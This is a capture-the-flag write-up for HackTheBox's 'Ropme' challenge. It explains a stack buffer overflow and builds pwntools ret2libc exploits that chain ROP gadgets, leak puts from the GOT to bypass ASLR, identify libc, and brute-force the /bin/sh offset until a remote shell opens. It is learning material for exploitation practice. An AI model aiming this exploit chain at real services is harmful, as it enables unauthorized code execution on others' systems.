# ROP

> Ropme challenge from HTB

```C
undefined8 main(void)

{
  char local_48 [64];
  
  puts("ROP me outside, how \'about dah?");
  fflush(stdout);
  fgets(local_48,500,stdin);
  return 0;
}
```

Immediately you can see buffer overflow despite using of `fgets()`.

The next point is no find out which offset the program will crash.
```bash
gef➤  r < <(python -c 'print "A" * 64')
Starting program: /home/kali/Downloads/ropme < <(python -c 'print "A" * 64')
ROP me outside, how 'about dah?
[Inferior 1 (process 5648) exited normally]
gef➤  r < <(python -c 'print "A" * 72')
Starting program: /home/kali/Downloads/ropme < <(python -c 'print "A" * 72')
ROP me outside, how 'about dah?

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e1000a in ?? () from /lib/x86_64-linux-gnu/libc.so.6
```

Okay, so after 64 bytes, we overwrote the rbp register and got segfault. The next 8 bytes (x64 binary) will be our target as RIP register.

As the name of the challenge said `Ropme` we need to use Return-Oreinted programming. Its concept is that you have chuncks of addresses called gadgets thar are just addresses of instructions such as `something action register + ret instruction`. That's why this method is called Return because you will return after each instruction. So, if you will put these addresses in a defined sequence, you will execute a chain of instructions.

Here, this method is easy. In x64 arch, you need to do syscall with this convention: [link](https://courses.cs.washington.edu/courses/cse378/10au/sections/Section1_recap.pdf).

The first argument needs to be stored in RDI register. The next one in RSI and so on.
I will execute just call `system` with `/bin/sh`. Therefore, I need one gadget `pop rdi; ret` which will pop next address right into RDI and return. After this gadget, need to put address of /bin/sh string and then, call of system function.
Software for gadgets searching: [ropper](https://github.com/sashs/ropper).

```bash
$ ropper --file ropme | grep "pop"                                                                                                                                                                                                     
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x000000000040058c: add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret; 
0x000000000040058e: add byte ptr [rax], al; pop rbp; ret; 
0x0000000000400578: add byte ptr [rax], al; test rax, rax; je 0x590; pop rbp; mov edi, 0x601048; jmp rax; 
0x00000000004005c6: add byte ptr [rax], al; test rax, rax; je 0x5d8; pop rbp; mov edi, 0x601048; jmp rax; 
0x000000000040057d: je 0x590; pop rbp; mov edi, 0x601048; jmp rax; 
0x00000000004005cb: je 0x5d8; pop rbp; mov edi, 0x601048; jmp rax; 
0x0000000000400588: nop dword ptr [rax + rax]; pop rbp; ret; 
0x00000000004005d5: nop dword ptr [rax]; pop rbp; ret; 
0x0000000000400587: nop word ptr [rax + rax]; pop rbp; ret; 
0x00000000004006cc: pop r12; pop r13; pop r14; pop r15; ret; 
0x00000000004006ce: pop r13; pop r14; pop r15; ret; 
0x00000000004006d0: pop r14; pop r15; ret; 
0x00000000004006d2: pop r15; ret; 
0x000000000040057f: pop rbp; mov edi, 0x601048; jmp rax; 
0x00000000004006cb: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x00000000004006cf: pop rbp; pop r14; pop r15; ret; 
0x0000000000400590: pop rbp; ret; 
0x00000000004006d3: pop rdi; ret; 
0x00000000004006d1: pop rsi; pop r15; ret; 
0x00000000004006cd: pop rsp; pop r13; pop r14; pop r15; ret; 
0x000000000040058a: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret; 
0x000000000040057b: test eax, eax; je 0x590; pop rbp; mov edi, 0x601048; jmp rax; 
0x00000000004005c9: test eax, eax; je 0x5d8; pop rbp; mov edi, 0x601048; jmp rax; 
0x000000000040057a: test rax, rax; je 0x590; pop rbp; mov edi, 0x601048; jmp rax; 
0x00000000004005c8: test rax, rax; je 0x5d8; pop rbp; mov edi, 0x601048; jmp rax;
```

This gadget is right what we need: `0x00000000004006d3: pop rdi; ret;`.
Next , use gdb:
```bash
gef➤  print system
$2 = {int (const char *)} 0x7ffff7e37e50 <__libc_system>

gef➤  search-pattern /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7ffff7f5f000-0x7ffff7fa9000), permission=r--
  0x7ffff7f79152 - 0x7ffff7f79159  →   "/bin/sh"
```

Thus, we have all gadgets and addresses.
Local exploit:
```python
#!/usr/bin/env python3
from pwn import *

p = process('./ropme')
#gdb.attach(p, 'b *main')
payload = b'A' * 72
payload += p64(0x4006d3)
payload += p64(0x7ffff7f79152)
payload += p64(0x7ffff7e37e50)
p.recv()
p.sendline(payload)
p.interactive()
```
```bash
python3 exploit.py                          
[+] Starting local process './ropme': pid 5907
[*] Switching to interactive mode
$ whoami
kali
$
```

We got execution on our machine. But the remote execution is pretty different. Remote target definitely has ASLR (Address-Space-Layout-Randomization), which prevents our execution with hardcoded addresses by randomizing address space. The evasion here is leaking the real address of some function, calculating the offset between real address and related address. And then moving our static addresses on this offset.

Global Offset Table maps the real address with related. See GOT with:
```bash
objdump -R ropme            

ropme:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__
0000000000601050 R_X86_64_COPY     stdout@@GLIBC_2.2.5
0000000000601060 R_X86_64_COPY     stdin@@GLIBC_2.2.5
0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000601020 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5
0000000000601028 R_X86_64_JUMP_SLOT  fgets@GLIBC_2.2.5
0000000000601030 R_X86_64_JUMP_SLOT  fflush@GLIBC_2.2.5
```

So, if we put the address of puts in the RDI and execute the puts function with the address of GOT in RDI, we will receive the leaked address.
```bash
objdump -d ropme -M intel  | grep puts
00000000004004e0 <puts@plt>:
  4004e0:       ff 25 32 0b 20 00       jmp    QWORD PTR [rip+0x200b32]        # 601018 <puts@GLIBC_2.2.5>
  40063a:       e8 a1 fe ff ff          call   4004e0 <puts@plt>
```
The right address is `4004e0`.

We need execute `fflush(0)` again or we will not get the address in output. It's simple cause we already knew how to use ROP.
```bash
objdump -d ropme -M intel  | grep fflush
0000000000400510 <fflush@plt>:
  400510:       ff 25 1a 0b 20 00       jmp    QWORD PTR [rip+0x200b1a]        # 601030 <fflush@GLIBC_2.2.5>
  400649:       e8 c2 fe ff ff          call   400510 <fflush@plt>
```

And Null address in RDI.

The exploit looks like this for now:
```python
#!/usr/bin/env python3
from pwn import *
import binascii
import sys

if sys.argv[1] == 'l':
    p = process('./ropme')
else:
    p = remote('206.189.20.127', 32648)
#gdb.attach(p, 'b *main')
payload = b'A' * 72
pop_rdi = p64(0x4006d3)
got_puts = p64(0x601018)
plt_puts = p64(0x4004e0)
payload += pop_rdi
payload += got_puts
payload += plt_puts
payload += pop_rdi
payload += p64(0x00)
plt_fflush = p64(0x400510)
payload += plt_fflush
p.recv()
p.sendline(payload)
leak = binascii.hexlify(p.recv()[:-1][::-1])
print(b'0x' + leak)
leak = p64(int(leak, 16))
print(leak)
p.interactive()
```

Executing it remotely:
```bash
python3 exploit.py r
[+] Opening connection to 206.189.20.127 on port 32648: Done
b'0x7f1169c25690'
b'\x90V\xc2i\x11\x7f\x00\x00'
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
```
Leaked the address! But I don't know where the system is. Need to find out the version of libc, tried to google some libc searcher and found this: https://libc.blukat.me/. For puts database didn't find libc. So, I leaked fflush and gets and it found:

> libc6_2.15-0ubuntu20.2_i386 libc6_2.15-0ubuntu20_i386

Don't use the database web interface. Git clone the repo and use tools there. https://github.com/niklasb/libc-database. Also, leak whatever you want, in the final script, I stayed on puts leaking. So, I leaked puts and then did this magic:
```bash
../find puts 690                                  
launchpad-ubuntu-glibc-oneiric (libc6_2.13-0ubuntu15_amd64)
launchpad-ubuntu-glibc-natty (libc6_2.13-0ubuntu4_amd64)
launchpad-ubuntu-glibc-xenial (libc6_2.23-0ubuntu10_amd64)
launchpad-ubuntu-glibc-xenial (libc6_2.23-0ubuntu11_amd64)
launchpad-ubuntu-glibc-xenial (libc6_2.23-0ubuntu4_amd64)
launchpad-ubuntu-glibc-xenial (libc6_2.23-0ubuntu5_amd64)
launchpad-ubuntu-glibc-xenial (libc6_2.23-0ubuntu6_amd64)
launchpad-ubuntu-glibc-xenial (libc6_2.23-0ubuntu7_amd64)
launchpad-ubuntu-glibc-xenial (libc6_2.23-0ubuntu9_amd64)
```

Then, I just started to brute-force the libraries because my final version of the exploit was ready. I just replaced offset values. SOOOO, finally, I tried the third libc and then GOT THIS OUTPUT.
```bash
python3 remote_exploit.py remote
[+] Opening connection to 159.65.54.14 on port 30989: Done
[*] '/home/kali/Downloads/ropme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
b"ROP me outside, how 'about dah?\n"
b'7f3697792690'
[BASE] libc: 0x00007f3697723000
b"ROP me outside, how 'about dah?\n"
Enum b'sh: 1: %s%s%s%s: not found\n'
[*] Closed connection to 159.65.54.14 port 30989
[+] Opening connection to 159.65.54.14 on port 30989: Done
b"ROP me outside, how 'about dah?\n"
b'7ff3565d0690'
[BASE] libc: 0x00007ff356561000
b"ROP me outside, how 'about dah?\n"
Traceback (most recent call last):
  File "/home/kali/Downloads/remote_exploit.py", line 97, in <module>
    main()
  File "/home/kali/Downloads/remote_exploit.py", line 92, in main
    exploit(p, puts_offset, system_offset, bin_sh_offset)
  File "/home/kali/Downloads/remote_exploit.py", line 55, in exploit
    print('Enum', p.recvline())
  File "/home/kali/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py", line 490, in recvline
    return self.recvuntil(self.newline, drop = not keepends, timeout = timeout)
  File "/home/kali/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py", line 333, in recvuntil
    res = self.recv(timeout=self.timeout)
  File "/home/kali/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py", line 105, in recv
    return self._recv(numb, timeout) or b''
  File "/home/kali/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py", line 183, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
  File "/home/kali/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py", line 154, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
  File "/home/kali/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py", line 58, in recv_raw
    raise EOFError
EOFError
[*] Closed connection to 159.65.54.14 port 30989
```

%s%s%s%s%s%s, heh? Therefore, the main reason for offset from the tool didn't work because the system can not execute the string on provided address. Then, I just rewrite my exploit to brute force the offset and found /bin/sh string!

```bash
python3 remote_exploit.py remote
[+] Opening connection to 159.65.54.14 on port 30989: Done
[*] '/home/kali/Downloads/ropme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
b"ROP me outside, how 'about dah?\n"
b'7f73bbdae690'
[BASE] libc: 0x00007f73bbd3f000
b"ROP me outside, how 'about dah?\n"
[LEAKING /bin/sh]: b'\n' 1625423
[*] Closed connection to 159.65.54.14 port 30989
[+] Opening connection to 159.65.54.14 on port 30989: Done
b"ROP me outside, how 'about dah?\n"
b'7fced3fbe690'
[BASE] libc: 0x00007fced3f4f000
b"ROP me outside, how 'about dah?\n"
[LEAKING /bin/sh]: b'TO FIX: \n' 1625415
[*] Closed connection to 159.65.54.14 port 30989
[+] Opening connection to 159.65.54.14 on port 30989: Done
b"ROP me outside, how 'about dah?\n"
b'7f45dff5d690'
[BASE] libc: 0x00007f45dfeee000
b"ROP me outside, how 'about dah?\n"
[LEAKING /bin/sh]: b'V_LEVEL\n' 1625407
[*] Closed connection to 159.65.54.14 port 30989
[+] Opening connection to 159.65.54.14 on port 30989: Done
b"ROP me outside, how 'about dah?\n"
b'7ff5791fa690'
[BASE] libc: 0x00007ff57918b000
b"ROP me outside, how 'about dah?\n"
[LEAKING /bin/sh]: b'GVERB\n' 1625399
[*] Closed connection to 159.65.54.14 port 30989
[+] Opening connection to 159.65.54.14 on port 30989: Done
b"ROP me outside, how 'about dah?\n"
b'7f74d3aaf690'
[BASE] libc: 0x00007f74d3a40000
b"ROP me outside, how 'about dah?\n"
[LEAKING /bin/sh]: b'ize.c\n' 1625391
[*] Closed connection to 159.65.54.14 port 30989
[+] Opening connection to 159.65.54.14 on port 30989: Done
b"ROP me outside, how 'about dah?\n"
b'7f28f5066690'
[BASE] libc: 0x00007f28f4ff7000
b"ROP me outside, how 'about dah?\n"
[LEAKING /bin/sh]: b'anonicalize.c\n' 1625383
[*] Closed connection to 159.65.54.14 port 30989
[+] Opening connection to 159.65.54.14 on port 30989: Done
b"ROP me outside, how 'about dah?\n"
b'f7a690'
[BASE] libc: 0x0000000000f0b000
b"g\x7f\nROP me outside, how 'about dah?\n"
[+] Opening connection to 159.65.54.14 on port 30989: Done
b"ROP me outside, how 'about dah?\n"
b'7fd6c73da690'
[BASE] libc: 0x00007fd6c736b000
b"ROP me outside, how 'about dah?\n"
[LEAKING /bin/sh]: b'/bin/sh\n' 1625367
```

Fixed the offset.
```bash
python3 remote_exploit.py remote
[+] Opening connection to 159.65.54.14 on port 30989: Done
[*] '/home/kali/Downloads/ropme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
b"ROP me outside, how 'about dah?\n"
b'7fe120603690'
[BASE] libc: 0x00007fe120594000
b"ROP me outside, how 'about dah?\n"
[*] Switching to interactive mode
$ w
 14:25:01 up 2 days,  1:34,  1 user,  load average: 0.53, 0.33, 0.23
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
```
